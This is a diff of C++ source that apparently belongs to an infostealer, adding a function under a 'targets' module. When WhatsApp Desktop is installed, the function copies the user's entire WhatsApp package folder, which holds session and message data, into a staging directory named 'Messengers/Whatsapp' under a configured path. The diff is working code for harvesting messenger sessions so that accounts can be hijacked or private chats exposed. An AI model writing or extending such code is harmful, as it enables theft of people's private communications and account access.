@@ -24,8 +24,44 @@
 
 #include "../targets.h"
 #include "../../config/config.c"
+#include  "../../helper/helper.h"
 
-void Whatsapp()
+void messengers::Whatsapp()
 {
+	printf("Whatsapp\n");
+	std::string user = func::GetUser();
+	std::string local = "C:/Users/" + user + "/AppData/Local";
 
+	if (std::filesystem::exists(local + "/Packages/5319275A.WhatsAppDesktop_cv1g1gvanyjgm"))
+	{
+		std::string defaultPaths[] = {
+
+	"C:/Users/" + user + config::path + "/Messengers",
+	"C:/Users/" + user + config::path + "/Messengers/Whatsapp",
+
+		};
+
+		std::string dirs[] = {
+
+			local+"/Packages/5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
+
+		};
+
+		for (size_t j = 0; j < std::size(defaultPaths); j++)
+		{
+			int result = _mkdir(defaultPaths[j].c_str());
+		}
+
+		try 
+		{
+			for (size_t i = 0; i < std::size(dirs); i++)
+			{
+				func::copyDirectory(dirs[i], defaultPaths[1]);
+			}
+		}
+		catch (const char* error_message)
+		{
+			std::cout << error_message << std::endl;
+		}
+	}
 }
